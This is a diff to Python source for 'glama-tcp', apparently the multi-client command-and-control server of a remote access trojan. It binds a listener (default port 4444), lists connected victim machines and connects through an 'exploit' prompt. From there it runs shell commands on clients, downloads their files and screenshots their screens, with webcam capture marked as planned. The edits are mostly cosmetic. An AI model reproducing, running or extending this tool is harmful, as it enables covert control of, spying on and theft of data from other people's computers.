@@ -23,8 +23,9 @@ COMMANDS = {'\u001b[33m\u001b[1m\nhelp   ': ['Shows this help'],
 
             'get    ': ['NEW!!! Downloading files from the client'],
             'screenshot': ['NEW!!! SCREENSHOT THE CLIENT SCREEN'],
-            'webcam ': ['FUTURE!!! CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n\n'],
+            'webcam ': ['(Not Added) CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n\n'],
             }
+
 
 class MultiServer(object):
 
@@ -40,16 +41,19 @@ class MultiServer(object):
         self.host = input("\u001b[33mSet the LHOST (empty for localhost): \u001b[0m")
         if self.host == '':
             self.host = 'localhost'
+
         self.port = input("\u001b[31mSet the LPORT (empty for 4444): \u001b[0m")
         try:
-            value = int(self.port)
+            self.port = int(self.port)
         except ValueError:
             self.port = 4444
+
         self.socket = None
         self.all_connections = []
         self.all_addresses = []
 
-        print("\nThe ip to use for client is \u001b[31m'%s'\u001b[0m. The port is:\u001b[31m %s\u001b[0m" % (self.host,self.port))
+        print("\nThe ip to use for client is \u001b[31m%s\u001b[0m. The port is:\u001b[31m %s\u001b[0m" % (
+            self.host, self.port))
         print("\u001b[36m\u001b[1mTo connect to the first client, type \u001b[0m\u001b[36m'exploit 0'\u001b[0m \n")
         print("\n\u001b[31m\u001b[1mType 'help' to see the list of commands\u001b[0m")
 
@@ -74,7 +78,7 @@ class MultiServer(object):
                 conn.close()
             except Exception as e:
                 print('Could not close connection %s' % str(e))
-                # continue
+                continue
         self.socket.close()
         sys.exit(0)
 
@@ -118,11 +122,11 @@ class MultiServer(object):
             self.all_connections.append(conn)
             self.all_addresses.append(address)
             print(
-                '\n\u001b[7m\u001b[35m\u001b[1mConnection has been established: {0} ({1})\u001b[0m'.format(address[-1],
+                '  \u001b[7m\u001b[35m\u001b[1mConnection has been established: {0} ({1})\u001b[0m'.format(address[-1],
                                                                                                            address[0]))
         return
 
-    def start_turtle(self):
+    def start_glama(self):
         """ Interactive prompt for sending commands remotely """
         while True:
             cmd = input('\u001b[36mglama-tcp>\u001b[0m ')
@@ -160,7 +164,8 @@ class MultiServer(object):
                 self.all_addresses[i][1]) + "\u001b[37m" + '   ' + "\u001b[36m" + str(
                 self.all_addresses[i][2]) + '\u001b[0m\n'
         print(
-            '\n\u001b[31mID\u001b[0m  \u001b[33mIP\u001b[0m           \u001b[35mPORT\u001b[0m    \u001b[36mCLIENT NAME\u001b[0m' + '\n\n' + results)
+            '\n\u001b[31mID\u001b[0m  \u001b[33mIP\u001b[0m           \u001b[35mPORT\u001b[0m    \u001b[36mCLIENT '
+            'NAME\u001b[0m' + '\n\n' + results)
         return
 
     def get_target(self, cmd):
@@ -238,7 +243,6 @@ class MultiServer(object):
         conn.send(str.encode('screen_' + filename + '.png'))
         self.download(conn)
 
-
     def send_target_commands(self, target, conn):
         """ Connect with remote target client
         :param conn:
@@ -294,7 +298,7 @@ def work(server):
             server.socket_bind()
             server.accept_connections()
         if x == 2:
-            server.start_turtle()
+            server.start_glama()
         queue.task_done()
 
 
